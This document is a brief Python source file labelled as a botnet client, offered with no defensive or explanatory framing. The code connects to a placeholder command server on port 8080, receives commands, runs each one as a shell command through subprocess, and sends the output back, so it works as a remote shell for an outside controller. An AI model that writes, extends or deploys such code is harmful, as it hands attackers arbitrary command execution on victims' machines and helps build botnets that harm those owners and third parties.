# Botnet client

import socket
import subprocess
import threading

def connect_to_botnet_server(server_ip):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, 8080))
    return client

def receive_commands(client):
    while True:
        command = client.recv(1024).decode()
        if command == "exit":
            client.close()
            break
        output = subprocess.getoutput(command)
        client.send(output.encode())

server_ip = "<server_ip>"
client = connect_to_botnet_server(server_ip)
receive_thread = threading.Thread(target=receive_commands, args=(client,))
receive_thread.start()
